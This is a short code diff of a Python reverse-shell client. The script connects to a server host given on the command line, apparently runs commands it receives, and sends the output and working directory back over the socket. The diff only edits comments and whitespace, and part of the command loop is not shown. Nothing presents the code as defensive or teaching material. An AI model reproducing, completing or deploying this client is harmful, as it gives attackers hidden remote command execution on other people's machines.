@@ -1,11 +1,11 @@
-import socket
+import socket ##Standard Library
 import os
 import subprocess
 import sys
 
 SERVER_HOST = sys.argv[1]
 SERVER_PORT = 6789
-BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, we can increase it
 # separator string for sending 2 messages in one go
 SEPARATOR = "<sep>"
 
@@ -48,5 +48,6 @@ while True:
     # send the results back to the server
     message = f"{output}{SEPARATOR}{cwd}"
     s.send(message.encode())
+    
 # close client connection
 s.close()
